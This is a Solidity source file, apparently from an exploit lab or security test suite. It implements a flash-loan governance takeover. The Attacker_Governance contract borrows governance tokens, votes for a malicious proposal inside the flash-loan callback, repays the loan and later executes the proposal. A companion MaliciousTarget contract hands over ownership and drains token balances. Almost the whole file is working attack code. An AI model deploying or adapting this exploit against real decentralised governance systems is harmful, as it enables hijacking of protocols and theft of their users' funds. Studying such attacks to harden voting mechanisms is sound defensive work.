// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

// Attack Vector: Governance Takeover via Flash Loan
// Steps:
// 1. Flash loan GOV tokens
// 2. Vote on malicious proposal with borrowed voting power
// 3. Repay flash loan
// 4. Execute proposal later

import "../interfaces/CommonInterfaces.sol";

interface IGovernance {
    function propose(address target, bytes memory callData, string memory description) external returns (uint256);
    function vote(uint256 proposalId, bool support) external;
    function execute(uint256 proposalId) external;
    function getProposalVotes(uint256 proposalId) external view returns (uint256 forVotes, uint256 againstVotes);
}

interface IFlashLender {
    function flashLoan(
        address receiver,
        address token,
        uint256 amount,
        bytes calldata data
    ) external returns (bool);
    function flashFee(address token, uint256 amount) external view returns (uint256);
}

contract Attacker_Governance {
    address public owner;
    IFlashLender public flashLender;
    IGovernance public governance;
    address public govToken;
    
    uint256 public proposalId;
    address public maliciousTarget;
    bytes public maliciousCallData;
    
    event AttackInitiated(uint256 flashAmount, uint256 proposalId);
    event VoteCast(uint256 proposalId, uint256 votes);
    event ProposalExecuted(uint256 proposalId);

    constructor(address _flashLender, address _governance, address _govToken) {
        owner = msg.sender;
        flashLender = IFlashLender(_flashLender);
        governance = IGovernance(_governance);
        govToken = _govToken;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    // Step 1: Setup malicious proposal (do this before attack)
    function setupProposal(address target, bytes memory callData, string memory description) external onlyOwner returns (uint256) {
        maliciousTarget = target;
        maliciousCallData = callData;
        
        // Need enough tokens to propose
        proposalId = governance.propose(target, callData, description);
        return proposalId;
    }

    // Step 2: Execute attack - flash loan and vote
    function attack(uint256 flashAmount, uint256 _proposalId) external onlyOwner {
        require(_proposalId > 0, "Invalid proposal");
        proposalId = _proposalId;
        
        emit AttackInitiated(flashAmount, proposalId);
        
        // Flash loan GOV tokens
        flashLender.flashLoan(
            address(this),
            govToken,
            flashAmount,
            abi.encode(proposalId)
        );
        
        // Check votes
        (uint256 forVotes, uint256 againstVotes) = governance.getProposalVotes(proposalId);
        emit VoteCast(proposalId, forVotes);
    }

    // Flash loan callback
    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        require(msg.sender == address(flashLender), "Untrusted lender");
        require(initiator == address(this), "Untrusted initiator");
        require(token == govToken, "Wrong token");
        
        uint256 _proposalId = abi.decode(data, (uint256));
        
        // Now we have massive voting power!
        // Vote in favor of our malicious proposal
        governance.vote(_proposalId, true);
        
        // Approve repayment
        uint256 repayment = amount + fee;
        IERC20(token).transfer(address(flashLender), repayment);
        
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    // Step 3: Execute malicious proposal after voting period
    function executeProposal(uint256 _proposalId) external onlyOwner {
        governance.execute(_proposalId);
        emit ProposalExecuted(_proposalId);
    }

    // Withdraw any tokens
    function withdraw(address token) external onlyOwner {
        uint256 balance = IERC20(token).balanceOf(address(this));
        if (balance > 0) {
            IERC20(token).transfer(owner, balance);
        }
    }

    // Fallback to receive ETH from executed proposal
    receive() external payable {}
}

// Malicious target contract example
contract MaliciousTarget {
    address public governance;
    address public newOwner;
    
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    
    constructor(address _governance) {
        governance = _governance;
    }
    
    // This function will be called by governance
    function transferOwnership(address _newOwner) external {
        require(msg.sender == governance, "Not governance");
        newOwner = _newOwner;
        emit OwnershipTransferred(address(0), _newOwner);
    }
    
    // Drain funds (example malicious action)
    function drain(address token, address to) external {
        require(msg.sender == newOwner, "Not owner");
        uint256 balance = IERC20(token).balanceOf(address(this));
        IERC20(token).transfer(to, balance);
    }
}

